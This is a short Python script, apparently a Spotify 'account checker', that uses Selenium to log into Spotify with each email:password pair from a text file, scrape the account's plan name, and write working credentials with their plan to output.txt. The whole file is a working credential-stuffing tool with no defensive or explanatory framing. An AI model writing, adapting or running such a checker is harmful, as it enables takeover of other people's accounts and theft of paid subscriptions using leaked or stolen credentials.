from selenium import webdriver
import time
from bs4 import BeautifulSoup

driver = webdriver.Firefox()


def check(user, password):

    driver.get("https://accounts.spotify.com/en/login")
    user_form = driver.find_element_by_id("login-username")
    password_form = driver.find_element_by_id("login-password")
    button = driver.find_element_by_class_name("btn-green")

    user_form.clear()
    password_form.clear()

    user_form.send_keys(user)
    password_form.send_keys(password)
    button.click()

    time.sleep(2)

    driver.get("https://www.spotify.com/us/account/overview/")
    parse = BeautifulSoup(driver.page_source, 'html5lib')
    
    for h3 in parse.find_all('h3', {'class': "product-name"}):
        account = '{}:{}:{}'.format(user, password, h3.get_text())
        print(account)
        output = open("output.txt", "w")
        output.write(account)
    
    driver.delete_all_cookies()

accounts_list = "./accounts.txt" # Change it with your list location

with open(accounts_list) as s:
    # Email and password should be like this : email:password
    for line in s:
        users, passwords = line.split(':')
        check(users.strip(), passwords.strip())
